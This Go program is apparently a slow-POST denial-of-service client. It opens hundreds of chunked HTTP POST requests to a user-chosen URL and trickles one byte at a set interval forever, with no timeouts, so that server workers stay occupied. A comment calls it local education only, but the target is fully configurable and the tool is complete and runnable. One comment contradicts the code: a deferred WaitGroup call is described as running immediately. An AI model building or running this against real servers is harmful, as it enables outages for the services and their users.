package main

// Trickle-slow HTTP client
// Establishes N HTTP POST requests to the target URL and then keeps
// sending a tiny chunk on a fixed interval forever. This keeps the
// server from timing out the connection while still occupying a worker
// that is blocked reading the request body.
//
// Usage examples:
//   go run hanging_client.go
//   go run hanging_client.go -url=http://localhost:8080/upload -conns=200 -tick=30s -chunk-size=1
//
// This is for local education/demonstration only.

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"sync"
	"time"
)

func main() {
	var (
		url       = flag.String("url", "http://localhost:8080/upload", "target URL to POST to and then trickle forever")
		conns     = flag.Int("conns", 200, "number of simultaneous slow/trickling requests")
		tickEvery = flag.Duration("tick", 30*time.Second, "interval between tiny body writes")
		chunkSz   = flag.Int("chunk-size", 1, "number of bytes to write each tick (keep tiny, e.g. 1-16)")
	)
	flag.Parse()

	// Optional port override via query parameter: ?port=NNNN
	if newURL, err := applyPortOverride(*url); err == nil {
		*url = newURL
	} else {
		log.Fatalf("invalid url: %v", err)
	}

	if *chunkSz <= 0 {
		log.Fatalf("chunk-size must be > 0")
	}

	client := &http.Client{} // no Timeout: we want to keep the connection(s) open indefinitely

	// Keep references so GC doesn't finalize and close pipes early.
	type hold struct {
		pr *io.PipeReader
		pw *io.PipeWriter
	}
	held := make([]hold, 0, *conns)

	// Use a WaitGroup only to know when all requests have been started (not completed).
	var started sync.WaitGroup
	started.Add(*conns)

	for i := 0; i < *conns; i++ {
		pr, pw := io.Pipe()
		held = append(held, hold{pr: pr, pw: pw})

		// Build the request whose body is the pipe reader.
		req, err := http.NewRequest(http.MethodPost, *url, pr)
		if err != nil {
			log.Fatalf("[%d] build request: %v", i, err)
		}
		req.Header.Set("Content-Type", "application/octet-stream")
		// Leave ContentLength at -1 (unknown) so Go uses chunked encoding.

		// Writer goroutine: trickle a few bytes forever, never closing the writer.
		go func(i int, pw *io.PipeWriter) {
			buf := make([]byte, *chunkSz)
			// zeros are fine; we "send 0% progress" while keeping the connection alive
			t := time.NewTicker(*tickEvery)
			defer t.Stop()
			for {
				// Write a tiny chunk; if the other side closes, this will error and exit.
				if _, err := pw.Write(buf); err != nil {
					_ = pw.CloseWithError(err)
					log.Printf("[%d] writer exiting: %v", i, err)
					return
				}
				<-t.C
			}
		}(i, pw)

		// Start the HTTP request in its own goroutine.
		go func(i int, req *http.Request) {
			defer started.Done() // mark as started right away; Do will likely never return
			_, err := client.Do(req)
			if err != nil {
				log.Printf("[%d] request error (possibly server timeout/close): %v", i, err)
				return
			}
			// If Do returns without error, the server somehow finished reading and responded.
		}(i, req)

		log.Printf("[%d] started trickling POST to %s (tick=%v, chunk=%dB)", i, *url, *tickEvery, *chunkSz)
	}

	// Wait until all requests have been initiated.
	started.Wait()
	fmt.Printf("established %d trickling HTTP request(s) to %s; holding open forever...\n", len(held), *url)
	select {} // block forever
}

// applyPortOverride allows specifying ?port=NNNN in the URL to override its network port.
// It removes the port query parameter from the final request URL.
func applyPortOverride(raw string) (string, error) {
	u, err := url.Parse(raw)
	if err != nil {
		return "", err
	}
	q := u.Query()
	p := q.Get("port")
	if p == "" {
		return raw, nil
	}
	q.Del("port")
	u.RawQuery = q.Encode()
	hostname := u.Hostname()
	if hostname == "" {
		hostname = u.Host
	}
	u.Host = net.JoinHostPort(hostname, p)
	return u.String(), nil
}
